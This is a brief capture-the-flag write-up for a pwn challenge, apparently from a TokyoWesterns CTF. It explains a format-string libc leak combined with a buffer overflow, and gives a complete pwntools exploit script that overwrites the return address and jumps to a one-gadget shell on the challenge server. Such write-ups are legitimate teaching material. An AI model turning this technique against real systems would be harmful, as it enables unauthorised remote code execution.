This problem has many vulnerabilities. There is an obvious printf vulnerability as well as a buffer overflow. So we trigger the printf to leak libc while also overwriting the return address to main to let it loop again, then call a one-shot shell to get the flag.

```
from pwn import *
#p=process("./warmup")
p=remote("nothing.chal.ctf.westerns.tokyo", 10001)
p.recvuntil(":)")
p.recvline()
pay="%7$saaaa"+p64(0x601018)
p.sendline(pay+"\x00"*(0x100-len(pay))+p64(0x4006BA))
x=p.recv(6)
libc=(u64(x+'\x00\x00'))
libc-=0x809c0
libb=libc+0x1b3e9a
libc+=0x10a38c
print hex(libb)
#gdb.attach(p)

p.sendline("\x00"*0x108+p64(libc)+p64(libc)+p64(0x400773)+"\x00"*0x100)
p.interactive()
```
